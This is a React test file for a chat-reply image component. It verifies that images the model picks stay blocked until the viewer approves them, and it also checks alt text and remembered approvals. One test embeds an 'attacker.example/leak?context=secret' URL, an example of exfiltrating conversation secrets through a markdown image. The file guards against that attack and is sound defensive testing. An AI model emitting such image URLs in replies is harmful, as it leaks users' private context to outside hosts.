import { it, expect, vi } from 'vitest';
import { fireEvent, render, screen } from '@testing-library/react';
import { ReplyMarkdownImage } from './ReplyMarkdownImage';

vi.mock('./ImageContainer', () => ({
  default: ({ src, alt }: { src: string; alt?: string }) => <img data-testid="loaded-image" src={src} alt={alt} />,
}));

it('does not load a model-chosen image until the viewer explicitly approves its URL', () => {
  const onSendMessage = vi.fn();
  const { rerender } = render(
    <ReplyMarkdownImage src="https://attacker.example/leak?context=secret" onSendMessage={onSendMessage} />
  );
  expect(screen.queryByTestId('loaded-image')).toBeNull();
  fireEvent.click(screen.getByTestId('reply-image-load-btn'));
  expect(screen.getByTestId('loaded-image')).toHaveAttribute('src', 'https://attacker.example/leak?context=secret');
  rerender(<ReplyMarkdownImage src="https://another.example/leak" onSendMessage={onSendMessage} />);
  expect(screen.queryByTestId('loaded-image')).toBeNull();
});

it('forwards the Markdown alt text to the loaded image', () => {
  render(<ReplyMarkdownImage src="https://example.com/chart.png" alt="sales chart" onSendMessage={vi.fn()} />);
  fireEvent.click(screen.getByTestId('reply-image-load-btn'));
  expect(screen.getByTestId('loaded-image')).toHaveAttribute('alt', 'sales chart');
});

it('keeps an approval made through approvedSources when it remounts', () => {
  const approvedSources = new Set<string>();
  const { unmount } = render(
    <ReplyMarkdownImage src="https://example.com/c.png" onSendMessage={vi.fn()} approvedSources={approvedSources} />
  );
  fireEvent.click(screen.getByTestId('reply-image-load-btn'));
  unmount();
  render(
    <ReplyMarkdownImage src="https://example.com/c.png" onSendMessage={vi.fn()} approvedSources={approvedSources} />
  );
  expect(screen.getByTestId('loaded-image')).toBeTruthy();
});
